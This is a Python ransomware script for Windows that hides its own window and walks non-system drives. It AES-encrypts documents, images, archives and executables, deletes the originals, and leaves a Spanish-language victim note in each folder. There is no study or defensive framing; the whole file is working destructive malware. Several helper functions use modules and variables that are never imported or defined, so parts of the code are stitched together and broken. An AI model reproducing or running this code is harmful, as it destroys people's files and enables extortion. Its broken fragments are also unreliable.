import os
import sys
import base64

from Crypto.Cipher import AES
from Crypto.Hash import SHA3_256

from win32 import win32api, win32gui, win32process

CONFIG = {
	'validExtensions':[
		'.pdf', '.txt', '.jpg', '.jpeg', '.png', '.doc', '.w3x', '.exe', '.iso',
		'.docx', 'mp4', '.rar', '.zip', '.mp3', '.ino'
	],
	'Suffix': '.XD',

	'RecoverTextName': 'PRECIONE AQUI.txt'
}
def check_internet():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect(('socket.io', 80))
        s.close()
    except:
        exit()

def get_hash():
    hashcomputer = os.environ['USERPROFILE'] + socket.gethostname() + str(random.randint(0,1000000000000000000000000000000))
    #print(hashcomputer)
    hashcomputer = hashlib.sha512(hashcomputer) #cadena de 128 caracteres
    hashcomputer = hashcomputer.hexdigest() #convertir a hexadecimal
    
    new_key = []

    for k in hashcomputer:
        if len(new_key) == 32:
            hashcomputer = ''.join(new_key)
            break
        else:
            new_key.append(k)

    return hashcomputer

def print_warning(path):
	message = """
	HAS SIDO VICTIMA DE MI VIRUS INFORMATICO
	PARA DESCARGAS "TIK TOK" :V
	"""

	with open(os.path.join(path, CONFIG['RecoverTextName']), 'w') as output_file:
		output_file.write(message)

def delate_file(file_path):
	if os.path.exists(file_path):
		os.remove(file_path)

def get_enc_key():
	key = base64.b64encode(os.environ['USERDOMAIN_ROAMINGPROFILE'].encode('ascii'))
	key = SHA3_256.new(key).digest()
	return key

def list_drives():
	drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
	return drives

def list_filas(drive):
	key = get_enc_key()
	last_dir = ''

	for root, subfiles, files in os.walk(drive):
		for file in files:
			file_path = os.path.join(root, file)
			_, extension = os.path.splitext(file)
			
			if extension in CONFIG['validExtensions']:
				crypto(key, file_path)
				delate_file(file_path)

				if root != last_dir:
					print_warning(root)
					last_dir = root 

def crypto(key, file_path):
	block_size = 65534
	initial_vector = os.urandom(16)

	output_path = file_path + CONFIG['Suffix']
	file_size = str(os.path.getsize(file_path)).zfill(16)

	encryptor = AES.new(key, AES.MODE_CBC, initial_vector)

	with open(file_path, 'rb') as input_file:
		with open(output_path, 'wb') as output_file:
			output_file.write(bytes(file_size, 'utf-8'))
			output_file.write(initial_vector)

			while True:
				block = input_file.read(block_size)

				if len(block) == 0:
					break

				if len(block) % 16 != 0:
					block += bytes(' ' * (16 - len(block) % 16 ), 'utf-8')

				output_file.write(encryptor.encrypt(block))

def discover(key):
    file_list = open('file_list', 'w+')
    for carpeta in carpetas:
        ruta = home+'/'+carpeta
        #print(ruta)
        for extension in extensiones:
            for rutabs, directorio, archivo in os.walk(ruta):
                #print(archivos)
                for file in archivo:
                    if file.endswith(extension):
                        file_list.write(os.path.join(rutabs, file)+'\n')
    file_list.close()

    lista = open('file_list', 'r')
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

def main():
	def callback(hwnd, pid):
		if win32process.GetWindowThreadProcessId(hwnd)[1] == pid:
			win32gui.Showwindow(hwnd, 0)

	win32gui.EnumWindows(callback, os.getpid())

	drives = list_drives()

	for drive in drives:
		if not "C:" in drive and not "D:" in drive:
			list_filas(drive)

if __name__ == "__main__":
	main()